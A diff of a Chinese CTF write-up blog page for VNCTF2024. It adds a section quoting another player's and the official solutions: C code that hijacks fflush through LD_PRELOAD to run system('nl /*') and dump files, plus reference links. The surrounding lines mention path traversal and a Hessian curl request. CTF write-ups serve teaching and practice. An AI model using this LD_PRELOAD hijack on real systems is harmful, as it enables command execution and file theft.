@@ -34,6 +34,9 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240217163208288.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240218170540368.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240219104201974.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240221003410654.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240221011055707.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240221004827390.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240219090225741.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240219090333407.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240219090112842.png">
@@ -42,7 +45,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240219095603497.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240218164642596.png">
 <meta property="article:published_time" content="2024-02-17T08:31:45.000Z">
-<meta property="article:modified_time" content="2024-02-20T15:53:06.169Z">
+<meta property="article:modified_time" content="2024-02-20T17:10:59.807Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/VNCTF2024/image-20240218163206298.png">
@@ -250,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5k 字
+          5.3k 字
         
       </span>
     
@@ -261,7 +264,7 @@
         
         
         
-          42 分钟
+          45 分钟
         
       </span>
     
@@ -384,10 +387,26 @@ param = &#123;
 r = requests<span class="hljs-selector-class">.get</span>(url,params=param)
 <span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r.text)</span></span></code></pre></div>
 
+<h3 id="p1ng师傅WP"><a href="#p1ng师傅WP" class="headerlink" title="p1ng师傅WP"></a>p1ng师傅WP</h3><p><img src="/../images/VNCTF2024/image-20240221003410654.png" srcset="/img/loading.gif" lazyload alt="image-20240221003410654"></p>
+<p>查看whoami调用的静态链接库</p>
+<p>然后劫持函数</p>
+<div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
 
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;              
+    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;nl /*&quot;</span>);              
+&#125;              
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fflush</span><span class="hljs-params">()</span> </span>&#123;              
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;              
+    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);              
+    <span class="hljs-built_in">payload</span>();              
+&#125;</code></pre></div>
 
-
-
+<p><img src="/../images/VNCTF2024/image-20240221011055707.png" srcset="/img/loading.gif" lazyload alt="image-20240221011055707"></p>
+<h3 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h3><p>别骂了别骂了</p>
+<p><img src="/../images/VNCTF2024/image-20240221004827390.png" srcset="/img/loading.gif" lazyload alt="image-20240221004827390"></p>
+<p>也是劫持函数</p>
+<p>噢，跟上面窜连起来了，上面劫持puts不成功是因为用了<code>unsetenv</code></p>
 <h2 id="CutePath"><a href="#CutePath" class="headerlink" title="CutePath"></a>CutePath</h2><p>最有心无力的一集，直接发现了遍历任意目录的漏洞，但是就是一直不知道怎么去读<code>flag.txt</code>，唉，直接卡死</p>
 <p>群友说是给<code>flag.txt</code>改名改到可下载的目录下，但是我也尝试过失败了（不知道咋改的</p>
 <p><img src="/../images/VNCTF2024/image-20240219090225741.png" srcset="/img/loading.gif" lazyload alt="image-20240219090225741"></p>
@@ -479,6 +498,8 @@ curl -X POST -H <span class="hljs-string">&quot;Content-Type: x-application/hess
 
 
 <h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p><img src="/../images/VNCTF2024/image-20240218164642596.png" srcset="/img/loading.gif" lazyload alt="image-20240218164642596"></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/f6hrKxrS-W-UjcC7fpTYvA">VNCTF2024-writeup (qq.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://l1nyz-tel.cc/2024/2/18/VNCTF2024-Writeup/">VNCTF2024 Writeup | TEL (l1nyz-tel.cc)</a></p>
 
                 
               </div>
